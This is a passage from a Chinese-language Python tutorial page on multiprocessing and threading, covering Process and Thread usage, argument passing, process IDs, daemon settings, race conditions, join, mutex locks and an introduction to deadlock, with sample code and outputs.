title="2. 进程的使用"></a>2. 进程的使用</h4><h5 id="2-1-进程的介绍"><a href="#2-1-进程的介绍" class="headerlink" title="2.1 进程的介绍"></a>2.1 进程的介绍</h5><p>在Python程序中，想要实现多任务可以使用进程来完成，进程是实现多任务的一种方式。</p><h5 id="2-2-进程的概念"><a href="#2-2-进程的概念" class="headerlink" title="2.2 进程的概念"></a>2.2 进程的概念</h5><p>一个正在运行的程序或者软件就是一个进程，<strong>它是操作系统进行资源分配的基本单位</strong>，也就是说每启动一个进程，操作系统都会给其分配一定的运行资源(内存资源)保证进程的运行。</p><p>比如:现实生活中的公司可以理解成是一个进程，公司提供办公资源(电脑、办公桌椅等)，真正干活的是员工，员工可以理解成线程。</p><p><strong>注意:</strong></p><p><strong>一个程序运行后至少有一个进程，一个进程默认有一个线程</strong>，进程里面可以创建多个线程，<strong>线程是依附在进程里面的，没有进程就没有线程</strong>。</p><p><strong>说明:</strong></p><p>多进程可以完成多任务，每个进程就好比一家独立的公司，每个公司都各自在运营，每个进程也各自在运行，执行各自的任务。</p><h5 id="2-3-多进程的使用"><a href="#2-3-多进程的使用" class="headerlink" title="2.3 多进程的使用"></a>2.3 多进程的使用</h5><h6 id="2-3-1-导入进程包"><a href="#2-3-1-导入进程包" class="headerlink" title="2.3.1 导入进程包"></a>2.3.1 导入进程包</h6><pre><code class="python">#导入进程包import multiprocessing</code></pre><h6 id="2-3-2-Process进程类的说明"><a href="#2-3-2-Process进程类的说明" class="headerlink" title="2.3.2 Process进程类的说明"></a>2.3.2 Process进程类的说明</h6><p><strong>Process([group [, target [, name [, args [, kwargs]]]]])</strong></p><ul><li>group：指定进程组，目前只能使用None</li><li>target：执行的目标任务名</li><li>name：进程名字</li><li>args：以元组方式给执行任务传参</li><li>kwargs：以字典方式给执行任务传参</li></ul><p><strong>Process创建的实例对象的常用方法:</strong></p><ul><li>start()：启动子进程实例（创建子进程）</li><li>join()：等待子进程执行结束</li><li>terminate()：不管任务是否完成，立即终止子进程</li></ul><p><strong>Process创建的实例对象的常用属性:</strong></p><p>name：当前进程的别名，默认为Process-N，N为从1开始递增的整数</p><h6 id="2-3-3-多进程完成多任务的代码"><a href="#2-3-3-多进程完成多任务的代码" class="headerlink" title="2.3.3 多进程完成多任务的代码"></a>2.3.3 多进程完成多任务的代码</h6><pre><code class="python">import multiprocessingimport time# 跳舞任务def dance():    for i in range(5):        print(&quot;跳舞中...&quot;)        time.sleep(0.2)# 唱歌任务def sing():    for i in range(5):        print(&quot;唱歌中...&quot;)        time.sleep(0.2)if __name__ == &#39;__main__&#39;:    # 创建跳舞的子进程    # group: 表示进程组，目前只能使用None    # target: 表示执行的目标任务名(函数名、方法名)    # name: 进程名称, 默认是Process-1, .....    dance_process = multiprocessing.Process(target=dance, name=&quot;process1&quot;)    sing_process = multiprocessing.Process(target=sing)    # 启动子进程执行对应的任务    dance_process.start()    sing_process.start()</code></pre><p><strong>执行结果:</strong></p><pre><code class="python">唱歌中...跳舞中...唱歌中...跳舞中...唱歌中...跳舞中...唱歌中...跳舞中...唱歌中...跳舞中...</code></pre><h5 id="2-4-获取进程编号"><a href="#2-4-获取进程编号" class="headerlink" title="2.4 获取进程编号"></a>2.4 获取进程编号</h5><h6 id="2-4-1-获取进程编号的目的"><a href="#2-4-1-获取进程编号的目的" class="headerlink" title="2.4.1 获取进程编号的目的"></a>2.4.1 获取进程编号的目的</h6><p><strong>获取进程编号的目的是验证主进程和子进程的关系，可以得知子进程是由那个主进程创建出来的。</strong></p><p>获取进程编号的两种操作</p><ul><li>获取当前进程编号</li><li>获取当前父进程编号</li></ul><h6 id="2-4-2-获取当前进程编号"><a href="#2-4-2-获取当前进程编号" class="headerlink" title="2.4.2 获取当前进程编号"></a>2.4.2 获取当前进程编号</h6><p><strong>os.getpid()</strong> 表示获取当前进程编号</p><p><strong>示例代码:</strong></p><pre><code class="python">import multiprocessingimport timeimport os# 跳舞任务def dance():    # 获取当前进程的编号    print(&quot;dance:&quot;, os.getpid())    # 获取当前进程    print(&quot;dance:&quot;, multiprocessing.current_process())    for i in range(5):        print(&quot;跳舞中...&quot;)        time.sleep(0.2)        # 扩展:根据进程编号杀死指定进程        os.kill(os.getpid(), 9)# 唱歌任务def sing():    # 获取当前进程的编号    print(&quot;sing:&quot;, os.getpid())    # 获取当前进程    print(&quot;sing:&quot;, multiprocessing.current_process())    for i in range(5):        print(&quot;唱歌中...&quot;)        time.sleep(0.2)if __name__ == &#39;__main__&#39;:    # 获取当前进程的编号    print(&quot;main:&quot;, os.getpid())    # 获取当前进程    print(&quot;main:&quot;, multiprocessing.current_process())    # 创建跳舞的子进程    # group: 表示进程组，目前只能使用None    # target: 表示执行的目标任务名(函数名、方法名)    # name: 进程名称, 默认是Process-1, .....    dance_process = multiprocessing.Process(target=dance, name=&quot;process1&quot;)    sing_process = multiprocessing.Process(target=sing)    # 启动子进程执行对应的任务    dance_process.start()    sing_process.start()</code></pre><p><strong>执行结果:</strong></p><pre><code class="python">main: 70763main: &lt;_MainProcess(MainProcess, started)&gt;dance: 70768dance: &lt;Process(myprocess1, started)&gt;跳舞中...sing: 70769sing: &lt;Process(Process-2, started)&gt;唱歌中...唱歌中...唱歌中...唱歌中...唱歌中...</code></pre><h6 id="2-4-3-获取当前父进程编号"><a href="#2-4-3-获取当前父进程编号" class="headerlink" title="2.4.3 获取当前父进程编号"></a>2.4.3 获取当前父进程编号</h6><p><strong>os.getppid()</strong> 表示获取当前父进程编号</p><p><strong>示例代码:</strong></p><pre><code class="python">import multiprocessingimport timeimport os# 跳舞任务def dance():    # 获取当前进程的编号    print(&quot;dance:&quot;, os.getpid())    # 获取当前进程    print(&quot;dance:&quot;, multiprocessing.current_process())    # 获取父进程的编号    print(&quot;dance的父进程编号:&quot;, os.getppid())    for i in range(5):        print(&quot;跳舞中...&quot;)        time.sleep(0.2)        # 扩展:根据进程编号杀死指定进程        os.kill(os.getpid(), 9)# 唱歌任务def sing():    # 获取当前进程的编号    print(&quot;sing:&quot;, os.getpid())    # 获取当前进程    print(&quot;sing:&quot;, multiprocessing.current_process())    # 获取父进程的编号    print(&quot;sing的父进程编号:&quot;, os.getppid())    for i in range(5):        print(&quot;唱歌中...&quot;)        time.sleep(0.2)if __name__ == &#39;__main__&#39;:    # 获取当前进程的编号    print(&quot;main:&quot;, os.getpid())    # 获取当前进程    print(&quot;main:&quot;, multiprocessing.current_process())    # 创建跳舞的子进程    # group: 表示进程组，目前只能使用None    # target: 表示执行的目标任务名(函数名、方法名)    # name: 进程名称, 默认是Process-1, .....    dance_process = multiprocessing.Process(target=dance, name=&quot;myprocess1&quot;)    sing_process = multiprocessing.Process(target=sing)    # 启动子进程执行对应的任务    dance_process.start()    sing_process.start()main: 70860main: &lt;_MainProcess(MainProcess, started)&gt;dance: 70861dance: &lt;Process(myprocess1, started)&gt;dance的父进程编号: 70860跳舞中...sing: 70862sing: &lt;Process(Process-2, started)&gt;sing的父进程编号: 70860唱歌中...唱歌中...唱歌中...唱歌中...唱歌中...</code></pre><h5 id="2-5-进程执行带有参数的任务"><a href="#2-5-进程执行带有参数的任务" class="headerlink" title="2.5 进程执行带有参数的任务"></a>2.5 进程执行带有参数的任务</h5><h6 id="2-5-1-进程执行带有参数的任务的介绍"><a href="#2-5-1-进程执行带有参数的任务的介绍" class="headerlink" title="2.5.1 进程执行带有参数的任务的介绍"></a>2.5.1 进程执行带有参数的任务的介绍</h6><p>前面我们使用进程执行的任务是没有参数的，假如我们使用进程执行的任务带有参数，如何给函数传参呢?</p><p>Process类执行任务并给任务传参数有两种方式:</p><ul><li>args 表示以元组的方式给执行任务传参</li><li>kwargs 表示以字典方式给执行任务传参</li></ul><h6 id="2-5-2-args参数的使用"><a href="#2-5-2-args参数的使用" class="headerlink" title="2.5.2 args参数的使用"></a>2.5.2 args参数的使用</h6><p><strong>示例代码:</strong></p><pre><code class="python">import multiprocessingimport time# 带有参数的任务def task(count):    for i in range(count):        print(&quot;任务执行中..&quot;)        time.sleep(0.2)    else:        print(&quot;任务执行完成&quot;)if __name__ == &#39;__main__&#39;:    # 创建子进程    # args: 以元组的方式给任务传入参数    sub_process = multiprocessing.Process(target=task, args=(5,))    sub_process.start()</code></pre><p><strong>执行结果:</strong></p><pre><code class="python">任务执行中..任务执行中..任务执行中..任务执行中..任务执行中..任务执行完成</code></pre><h6 id="2-5-3-kwargs参数的使用"><a href="#2-5-3-kwargs参数的使用" class="headerlink" title="2.5.3 kwargs参数的使用"></a>2.5.3 kwargs参数的使用</h6><p><strong>示例代码:</strong></p><pre><code class="python">import multiprocessingimport time# 带有参数的任务def task(count):    for i in range(count):        print(&quot;任务执行中..&quot;)        time.sleep(0.2)    else:        print(&quot;任务执行完成&quot;)if __name__ == &#39;__main__&#39;:    # 创建子进程    # kwargs: 表示以字典方式传入参数    sub_process = multiprocessing.Process(target=task, kwargs={&quot;count&quot;: 3})    sub_process.start()</code></pre><p><strong>执行结果:</strong></p><pre><code class="python">任务执行中..任务执行中..任务执行中..任务执行完成</code></pre><h5 id="2-6-进程的注意点"><a href="#2-6-进程的注意点" class="headerlink" title="2.6 进程的注意点"></a>2.6 进程的注意点</h5><h6 id="2-6-1-进程的注意点介绍"><a href="#2-6-1-进程的注意点介绍" class="headerlink" title="2.6.1 进程的注意点介绍"></a>2.6.1 进程的注意点介绍</h6><ol><li>进程之间不共享全局变量</li><li>主进程会等待所有的子进程执行结束再结束</li></ol><h6 id="2-6-2-进程之间不共享全局变量"><a href="#2-6-2-进程之间不共享全局变量" class="headerlink" title="2.6.2 进程之间不共享全局变量"></a>2.6.2 进程之间不共享全局变量</h6><pre><code class="python">import multiprocessingimport time# 定义全局变量g_list = list()# 添加数据的任务def add_data():    for i in range(5):        g_list.append(i)        print(&quot;add:&quot;, i)        time.sleep(0.2)    # 代码执行到此，说明数据添加完成    print(&quot;add_data:&quot;, g_list)def read_data():    print(&quot;read_data&quot;, g_list)if __name__ == &#39;__main__&#39;:    # 创建添加数据的子进程    add_data_process = multiprocessing.Process(target=add_data)    # 创建读取数据的子进程    read_data_process = multiprocessing.Process(target=read_data)    # 启动子进程执行对应的任务    add_data_process.start()    # 主进程等待添加数据的子进程执行完成以后程序再继续往下执行，读取数据    add_data_process.join()    read_data_process.start()    print(&quot;main:&quot;, g_list)    # 总结: 多进程之间不共享全局变量</code></pre><p><strong>执行结果:</strong></p><pre><code class="python">add: 0add: 1add: 2add: 3add: 4add_data: [0, 1, 2, 3, 4]main: []read_data []</code></pre><h6 id="2-6-3-进程之间不共享全局变量的小结"><a href="#2-6-3-进程之间不共享全局变量的小结" class="headerlink" title="2.6.3 进程之间不共享全局变量的小结"></a>2.6.3 进程之间不共享全局变量的小结</h6><ul><li>创建子进程会对主进程资源进行拷贝，也就是说子进程是主进程的一个副本，好比是一对双胞胎，之所以进程之间不共享全局变量，是因为操作的不是同一个进程里面的全局变量，只不过不同进程里面的全局变量名字相同而已。</li></ul><h6 id="2-6-4-主进程会等待所有的子进程执行结束再结束"><a href="#2-6-4-主进程会等待所有的子进程执行结束再结束" class="headerlink" title="2.6.4 主进程会等待所有的子进程执行结束再结束"></a>2.6.4 主进程会等待所有的子进程执行结束再结束</h6><p>假如我们现在创建一个子进程，这个子进程执行完大概需要2秒钟，现在让主进程执行0.5秒钟就退出程序，查看一下执行结果，示例代码如下:</p><pre><code class="python">import multiprocessingimport time# 定义进程所需要执行的任务def task():    for i in range(10):        print(&quot;任务执行中...&quot;)        time.sleep(0.2)if __name__ == &#39;__main__&#39;:    # 创建子进程    sub_process = multiprocessing.Process(target=task)    sub_process.start()    # 主进程延时0.5秒钟    time.sleep(0.5)    print(&quot;over&quot;)    exit()    # 总结： 主进程会等待所有的子进程执行完成以后程序再退出</code></pre><p><strong>执行结果:</strong></p><pre><code class="python">任务执行中...任务执行中...任务执行中...over任务执行中...任务执行中...任务执行中...任务执行中...任务执行中...任务执行中...任务执行中...</code></pre><p><strong>说明:</strong></p><p>通过上面代码的执行结果，我们可以得知: <strong>主进程会等待所有的子进程执行结束再结束</strong></p><p>假如我们就让主进程执行0.5秒钟，子进程就销毁不再执行，那怎么办呢?</p><ul><li>我们可以设置<strong>守护主进程</strong> 或者 在主进程退出之前 <strong>让子进程销毁</strong></li></ul><p><strong>守护主进程:</strong></p><ul><li>守护主进程就是主进程退出子进程销毁不再执行</li></ul><p><strong>子进程销毁:</strong></p><ul><li>子进程执行结束</li></ul><p><strong>保证主进程正常退出的示例代码:</strong></p><pre><code class="python">import multiprocessingimport time# 定义进程所需要执行的任务def task():    for i in range(10):        print(&quot;任务执行中...&quot;)        time.sleep(0.2)if __name__ == &#39;__main__&#39;:    # 创建子进程    sub_process = multiprocessing.Process(target=task)    # 设置守护主进程，主进程退出子进程直接销毁，子进程的生命周期依赖与主进程    # sub_process.daemon = True    sub_process.start()    time.sleep(0.5)    print(&quot;over&quot;)    # 让子进程销毁    sub_process.terminate()    exit()    # 总结： 主进程会等待所有的子进程执行完成以后程序再退出    # 如果想要主进程退出子进程销毁，可以设置守护主进程或者在主进程退出之前让子进程销毁</code></pre><p><strong>执行结果:</strong></p><pre><code class="python">任务执行中...任务执行中...任务执行中...over</code></pre><h6 id="2-6-5-主进程会等待所有的子进程执行结束再结束的小结"><a href="#2-6-5-主进程会等待所有的子进程执行结束再结束的小结" class="headerlink" title="2.6.5 主进程会等待所有的子进程执行结束再结束的小结"></a>2.6.5 主进程会等待所有的子进程执行结束再结束的小结</h6><ul><li>为了保证子进程能够正常的运行，主进程会等所有的子进程执行完成以后再销毁，设置守护主进程的目的是<strong>主进程退出子进程销毁，不让主进程再等待子进程去执行</strong>。</li><li>设置守护主进程方式： <strong>子进程对象.daemon = True</strong></li><li>销毁子进程方式： <strong>子进程对象.terminate()</strong></li></ul><h4 id="3-线程的使用"><a href="#3-线程的使用" class="headerlink" title="3. 线程的使用"></a>3. 线程的使用</h4><h5 id="3-1-线程的介绍"><a href="#3-1-线程的介绍" class="headerlink" title="3.1 线程的介绍"></a>3.1 线程的介绍</h5><p>在Python中，想要实现多任务除了使用进程，还可以使用线程来完成，线程是实现多任务的另外一种方式。</p><h5 id="3-2-线程的概念"><a href="#3-2-线程的概念" class="headerlink" title="3.2 线程的概念"></a>3.2 线程的概念</h5><p>线程是进程中执行代码的一个分支，每个执行分支（线程）要想工作执行代码需要cpu进行调度 ，也就是说线程是cpu调度的基本单位，每个进程至少都有一个线程，而这个线程就是我们通常说的主线程。</p><h5 id="3-3-线程的作用"><a href="#3-3-线程的作用" class="headerlink" title="3.3 线程的作用"></a>3.3 线程的作用</h5><p>多线程可以完成多任务</p><h5 id="3-4-多线程的使用"><a href="#3-4-多线程的使用" class="headerlink" title="3.4 多线程的使用"></a>3.4 多线程的使用</h5><h6 id="3-4-1-导入线程模块"><a href="#3-4-1-导入线程模块" class="headerlink" title="3.4.1 导入线程模块"></a>3.4.1 导入线程模块</h6><pre><code class="python">#导入线程模块import threading</code></pre><h6 id="3-4-2-线程类Thread参数说明"><a href="#3-4-2-线程类Thread参数说明" class="headerlink" title="3.4.2 线程类Thread参数说明"></a>3.4.2 线程类Thread参数说明</h6><p>Thread([group [, target [, name [, args [, kwargs]]]]])</p><ul><li>group: 线程组，目前只能使用None</li><li>target: 执行的目标任务名</li><li>args: 以元组的方式给执行任务传参</li><li>kwargs: 以字典方式给执行任务传参</li><li>name: 线程名，一般不用设置</li></ul><h6 id="3-4-3-启动线程"><a href="#3-4-3-启动线程" class="headerlink" title="3.4.3 启动线程"></a>3.4.3 启动线程</h6><p>启动线程使用start方法</p><h6 id="3-4-4-多线程完成多任务的代码"><a href="#3-4-4-多线程完成多任务的代码" class="headerlink" title="3.4.4 多线程完成多任务的代码"></a>3.4.4 多线程完成多任务的代码</h6><pre><code class="python">import threadingimport time# 唱歌任务def sing():    # 扩展： 获取当前线程    # print(&quot;sing当前执行的线程为：&quot;, threading.current_thread())    for i in range(3):        print(&quot;正在唱歌...%d&quot; % i)        time.sleep(1)# 跳舞任务def dance():    # 扩展： 获取当前线程    # print(&quot;dance当前执行的线程为：&quot;, threading.current_thread())    for i in range(3):        print(&quot;正在跳舞...%d&quot; % i)        time.sleep(1)if __name__ == &#39;__main__&#39;:    # 扩展： 获取当前线程    # print(&quot;当前执行的线程为：&quot;, threading.current_thread())    # 创建唱歌的线程    # target： 线程执行的函数名    sing_thread = threading.Thread(target=sing)    # 创建跳舞的线程    dance_thread = threading.Thread(target=dance)    # 开启线程    sing_thread.start()    dance_thread.start()</code></pre><p><strong>执行结果:</strong></p><pre><code class="python">正在唱歌...0正在跳舞...0正在唱歌...1正在跳舞...1正在唱歌...2正在跳舞...2</code></pre><h5 id="3-5-线程执行带有参数的任务"><a href="#3-5-线程执行带有参数的任务" class="headerlink" title="3.5 线程执行带有参数的任务"></a>3.5 线程执行带有参数的任务</h5><h6 id="3-5-1-线程执行带有参数的任务的介绍"><a href="#3-5-1-线程执行带有参数的任务的介绍" class="headerlink" title="3.5.1 线程执行带有参数的任务的介绍"></a>3.5.1 线程执行带有参数的任务的介绍</h6><p>前面我们使用线程执行的任务是没有参数的，假如我们使用线程执行的任务带有参数，如何给函数传参呢?</p><p>Thread类执行任务并给任务传参数有两种方式:</p><ul><li>args 表示以元组的方式给执行任务传参</li><li>kwargs 表示以字典方式给执行任务传参</li></ul><h6 id="3-5-2-args参数的使用"><a href="#3-5-2-args参数的使用" class="headerlink" title="3.5.2 args参数的使用"></a>3.5.2 args参数的使用</h6><p><strong>示例代码:</strong></p><pre><code class="python">import threadingimport time# 带有参数的任务def task(count):    for i in range(count):        print(&quot;任务执行中..&quot;)        time.sleep(0.2)    else:        print(&quot;任务执行完成&quot;)if __name__ == &#39;__main__&#39;:    # 创建子线程    # args: 以元组的方式给任务传入参数    sub_thread = threading.Thread(target=task, args=(5,))    sub_thread.start()</code></pre><p><strong>执行结果:</strong></p><pre><code class="python">任务执行中..任务执行中..任务执行中..任务执行中..任务执行中..任务执行完成</code></pre><h6 id="3-5-3-kwargs参数的使用"><a href="#3-5-3-kwargs参数的使用" class="headerlink" title="3.5.3 kwargs参数的使用"></a>3.5.3 kwargs参数的使用</h6><p><strong>示例代码:</strong></p><pre><code class="python">import threadingimport time# 带有参数的任务def task(count):    for i in range(count):        print(&quot;任务执行中..&quot;)        time.sleep(0.2)    else:        print(&quot;任务执行完成&quot;)if __name__ == &#39;__main__&#39;:    # 创建子线程    # kwargs: 表示以字典方式传入参数    sub_thread = threading.Thread(target=task, kwargs={&quot;count&quot;: 3})    sub_thread.start()</code></pre><p><strong>执行结果:</strong></p><pre><code class="python">任务执行中..任务执行中..任务执行中..任务执行完成</code></pre><h5 id="3-6-线程的注意点"><a href="#3-6-线程的注意点" class="headerlink" title="3.6 线程的注意点"></a>3.6 线程的注意点</h5><h6 id="3-6-1-线程的注意点介绍"><a href="#3-6-1-线程的注意点介绍" class="headerlink" title="3.6.1 线程的注意点介绍"></a>3.6.1 线程的注意点介绍</h6><ol><li>线程之间执行是无序的</li><li>主线程会等待所有的子线程执行结束再结束</li><li>线程之间共享全局变量</li><li>线程之间共享全局变量数据出现错误问题</li></ol><h6 id="3-6-2-线程之间执行是无序的"><a href="#3-6-2-线程之间执行是无序的" class="headerlink" title="3.6.2 线程之间执行是无序的"></a>3.6.2 线程之间执行是无序的</h6><pre><code class="python">import threadingimport timedef task():    time.sleep(1)    print(&quot;当前线程:&quot;, threading.current_thread().name)if __name__ == &#39;__main__&#39;:   for _ in range(5):       sub_thread = threading.Thread(target=task)       sub_thread.start()</code></pre><p><strong>执行结果:</strong></p><pre><code class="python">当前线程: Thread-1当前线程: Thread-2当前线程: Thread-4当前线程: Thread-5当前线程: Thread-3</code></pre><p><strong>说明:</strong></p><ul><li>线程之间执行是无序的，它是由cpu调度决定的 ，cpu调度哪个线程，哪个线程就先执行，没有调度的线程不能执行。</li><li>进程之间执行也是无序的，它是由操作系统调度决定的，操作系统调度哪个进程，哪个进程就先执行，没有调度的进程不能执行。</li></ul><h6 id="3-6-3-主线程会等待所有的子线程执行结束再结束"><a href="#3-6-3-主线程会等待所有的子线程执行结束再结束" class="headerlink" title="3.6.3 主线程会等待所有的子线程执行结束再结束"></a>3.6.3 主线程会等待所有的子线程执行结束再结束</h6><p>假如我们现在创建一个子线程，这个子线程执行完大概需要2.5秒钟，现在让主线程执行1秒钟就退出程序，查看一下执行结果，示例代码如下:</p><pre><code class="python">import threadingimport time# 测试主线程是否会等待子线程执行完成以后程序再退出def show_info():    for i in range(5):        print(&quot;test:&quot;, i)        time.sleep(0.5)if __name__ == &#39;__main__&#39;:    sub_thread = threading.Thread(target=show_info)    sub_thread.start()    # 主线程延时1秒    time.sleep(1)    print(&quot;over&quot;)</code></pre><p><strong>执行结果:</strong></p><pre><code class="python">test: 0test: 1overtest: 2test: 3test: 4</code></pre><p><strong>说明:</strong></p><p>通过上面代码的执行结果，我们可以得知: <strong>主线程会等待所有的子线程执行结束再结束</strong></p><p>假如我们就让主线程执行1秒钟，子线程就销毁不再执行，那怎么办呢?</p><ul><li>我们可以设置<strong>守护主线程</strong></li></ul><p><strong>守护主线程:</strong></p><ul><li>守护主线程就是主线程退出子线程销毁不再执行</li></ul><p><strong>设置守护主线程有两种方式：</strong></p><ol><li>threading.Thread(target=show_info, daemon=True)</li><li>线程对象.setDaemon(True)</li></ol><p><strong>设置守护主线程的示例代码:</strong></p><pre><code class="python">import threadingimport time# 测试主线程是否会等待子线程执行完成以后程序再退出def show_info():    for i in range(5):        print(&quot;test:&quot;, i)        time.sleep(0.5)if __name__ == &#39;__main__&#39;:    # 创建子线程守护主线程     # daemon=True 守护主线程    # 守护主线程方式1    sub_thread = threading.Thread(target=show_info, daemon=True)    # 设置成为守护主线程，主线程退出后子线程直接销毁不再执行子线程的代码    # 守护主线程方式2    # sub_thread.setDaemon(True)    sub_thread.start()    # 主线程延时1秒    time.sleep(1)    print(&quot;over&quot;)</code></pre><p><strong>执行结果:</strong></p><pre><code class="python">test: 0test: 1over</code></pre><h6 id="3-6-4-线程之间共享全局变量"><a href="#3-6-4-线程之间共享全局变量" class="headerlink" title="3.6.4 线程之间共享全局变量"></a>3.6.4 线程之间共享全局变量</h6><p><strong>需求:</strong></p><ol><li>定义一个列表类型的全局变量</li><li>创建两个子线程分别执行向全局变量添加数据的任务和向全局变量读取数据的任务</li><li>查看线程之间是否共享全局变量数据</li></ol><pre><code class="python">import threadingimport time# 定义全局变量my_list = list()# 写入数据任务def write_data():    for i in range(5):        my_list.append(i)        time.sleep(0.1)    print(&quot;write_data:&quot;, my_list)# 读取数据任务def read_data():    print(&quot;read_data:&quot;, my_list)if __name__ == &#39;__main__&#39;:    # 创建写入数据的线程    write_thread = threading.Thread(target=write_data)    # 创建读取数据的线程    read_thread = threading.Thread(target=read_data)    write_thread.start()    # 延时    # time.sleep(1)    # 主线程等待写入线程执行完成以后代码在继续往下执行    write_thread.join()    print(&quot;开始读取数据啦&quot;)    read_thread.start()</code></pre><p><strong>执行结果:</strong></p><pre><code class="python">write_data: [0, 1, 2, 3, 4]开始读取数据啦read_data: [0, 1, 2, 3, 4]</code></pre><h6 id="3-6-5-线程之间共享全局变量数据出现错误问题"><a href="#3-6-5-线程之间共享全局变量数据出现错误问题" class="headerlink" title="3.6.5 线程之间共享全局变量数据出现错误问题"></a>3.6.5 线程之间共享全局变量数据出现错误问题</h6><p><strong>需求:</strong></p><ol><li>定义两个函数，实现循环100万次，每循环一次给全局变量加1</li><li>创建两个子线程执行对应的两个函数，查看计算后的结果</li></ol><pre><code class="python">import threading# 定义全局变量g_num = 0# 循环一次给全局变量加1def sum_num1():    for i in range(1000000):        global g_num        g_num += 1    print(&quot;sum1:&quot;, g_num)# 循环一次给全局变量加1def sum_num2():    for i in range(1000000):        global g_num        g_num += 1    print(&quot;sum2:&quot;, g_num)if __name__ == &#39;__main__&#39;:    # 创建两个线程    first_thread = threading.Thread(target=sum_num1)    second_thread = threading.Thread(target=sum_num2)    # 启动线程    first_thread.start()    # 启动线程    second_thread.start()</code></pre><p><strong>执行结果:</strong></p><pre><code class="python">sum1: 1210949sum2: 1496035</code></pre><p><strong>注意点:</strong></p><p><strong>多线程同时对全局变量操作数据发生了错误</strong></p><p><strong>错误分析:</strong></p><p>两个线程first_thread和second_thread都要对全局变量g_num(默认是0)进行加1运算，但是由于是多线程同时操作，有可能出现下面情况：</p><ol><li>在g_num=0时，first_thread取得g_num=0。此时系统把first_thread调度为”sleeping”状态，把second_thread转换为”running”状态，t2也获得g_num=0</li><li>然后second_thread对得到的值进行加1并赋给g_num，使得g_num=1</li><li>然后系统又把second_thread调度为”sleeping”，把first_thread转为”running”。线程t1又把它之前得到的0加1后赋值给g_num。</li><li>这样导致虽然first_thread和first_thread都对g_num加1，但结果仍然是g_num=1</li></ol><p><strong>全局变量数据错误的解决办法:</strong></p><p>线程同步: 保证同一时刻只能有一个线程去操作全局变量 同步: 就是协同步调，按预定的先后次序进行运行。如:你说完，我再说, 好比现实生活中的对讲机</p><p>线程同步的方式:</p><ol><li><strong>线程等待(join)</strong></li><li><strong>互斥锁</strong></li></ol><h4 id="4-线程同步与互斥锁"><a href="#4-线程同步与互斥锁" class="headerlink" title="4. 线程同步与互斥锁"></a>4. 线程同步与互斥锁</h4><h5 id="4-1线程同步"><a href="#4-1线程同步" class="headerlink" title="4.1线程同步:"></a>4.1线程同步:</h5><p>线程同步: 保证同一时刻只能有一个线程去操作全局变量 同步: 就是协同步调，按预定的先后次序进行运行。如:你说完，我再说, 好比现实生活中的对讲机</p><p><strong>线程等待的示例代码:</strong></p><pre><code class="python">import threading# 定义全局变量g_num = 0# 循环1000000次每次给全局变量加1def sum_num1():    for i in range(1000000):        global g_num        g_num += 1    print(&quot;sum1:&quot;, g_num)# 循环1000000次每次给全局变量加1def sum_num2():    for i in range(1000000):        global g_num        g_num += 1    print(&quot;sum2:&quot;, g_num)if __name__ == &#39;__main__&#39;:    # 创建两个线程    first_thread = threading.Thread(target=sum_num1)    second_thread = threading.Thread(target=sum_num2)    # 启动线程    first_thread.start()    # 主线程等待第一个线程执行完成以后代码再继续执行，让其执行第二个线程    # 线程同步： 一个任务执行完成以后另外一个任务才能执行，同一个时刻只有一个任务在执行    first_thread.join()    # 启动线程    second_thread.start()</code></pre><p><strong>执行结果:</strong></p><pre><code class="python">sum1: 1000000sum2: 2000000</code></pre><h5 id="4-2-互斥锁的概念"><a href="#4-2-互斥锁的概念" class="headerlink" title="4.2 互斥锁的概念"></a>4.2 互斥锁的概念</h5><p>互斥锁: 对共享数据进行锁定，保证同一时刻只能有一个线程去操作。</p><p>注意:</p><ul><li>互斥锁是<strong>多个线程一起去抢</strong>，抢到锁的线程先执行，没有抢到锁的线程需要等待，等互斥锁使用完释放后，其它等待的线程再去抢这个锁。</li></ul><h5 id="4-3-互斥锁的使用"><a href="#4-3-互斥锁的使用" class="headerlink" title="4.3 互斥锁的使用"></a>4.3 互斥锁的使用</h5><p>threading模块中定义了Lock变量，这个变量本质上是一个函数，通过调用这个函数可以获取一把互斥锁。</p><p><strong>互斥锁使用步骤:</strong></p><pre><code class="python"># 创建锁mutex = threading.Lock()# 上锁mutex.acquire()...这里编写代码能保证同一时刻只能有一个线程去操作, 对共享数据进行锁定...# 释放锁mutex.release()</code></pre><p><strong>注意点:</strong></p><ul><li><strong>acquire和release方法之间的代码同一时刻只能有一个线程去操作</strong></li><li><strong>如果在调用acquire方法的时候 其他线程已经使用了这个互斥锁，那么此时acquire方法会堵塞，直到这个互斥锁释放后才能再次上锁。</strong></li></ul><h5 id="4-4-使用互斥锁完成2个线程对同一个全局变量各加100万次的操作"><a href="#4-4-使用互斥锁完成2个线程对同一个全局变量各加100万次的操作" class="headerlink" title="4.4 使用互斥锁完成2个线程对同一个全局变量各加100万次的操作"></a>4.4 使用互斥锁完成2个线程对同一个全局变量各加100万次的操作</h5><pre><code class="python">import threading# 定义全局变量g_num = 0# 创建全局互斥锁lock = threading.Lock()# 循环一次给全局变量加1def sum_num1():    # 上锁    lock.acquire()    for i in range(1000000):        global g_num        g_num += 1    print(&quot;sum1:&quot;, g_num)    # 释放锁    lock.release()# 循环一次给全局变量加1def sum_num2():    # 上锁    lock.acquire()    for i in range(1000000):        global g_num        g_num += 1    print(&quot;sum2:&quot;, g_num)    # 释放锁    lock.release()if __name__ == &#39;__main__&#39;:    # 创建两个线程    first_thread = threading.Thread(target=sum_num1)    second_thread = threading.Thread(target=sum_num2)    # 启动线程    first_thread.start()    second_thread.start()    # 提示：加上互斥锁，那个线程抢到这个锁我们决定不了，那线程抢到锁那个线程先执行，没有抢到的线程需要等待    # 加上互斥锁多任务瞬间变成单任务，性能会下降，也就是说同一时刻只能有一个线程去执行</code></pre><p><strong>执行结果:</strong></p><pre><code class="python">sum1: 1000000sum2: 2000000</code></pre><p><strong>说明:</strong></p><p>通过执行结果可以地址<strong>互斥锁能够保证多个线程访问共享数据不会出现数据错误问题</strong></p><h4 id="5-死锁介绍"><a href="#5-死锁介绍" class="headerlink" title="5. 死锁介绍"></a>5. 死锁介绍</h4><h5 id="5-1-死锁的概念"><a href="#5-1-死锁的概念" class="headerlink" title="5.1 死锁的概念"></a>5.1 死锁的概念</h5><p>死锁: 一直等待对方释放锁的情景就是死锁</p><p><strong>说明:</strong></p><p>现实社会中，男女双方一直等待对方先道歉的这种行为就好比是死锁。</p><p><strong>死锁的结果</strong></p><ul><li>会造成应用程序的停止响应，不能再处理其它任务了。</li></ul><h5 id="5-2-死锁示例"><a href="#5-2-死锁示例" class="headerlink" title="5.2 死锁示例"></a>5.2 死锁示例</h5><p><strong>需求:</strong></p><p>根据下标在列表中取值, 保证同一时刻只能有一个线程去取值</p><pre><code 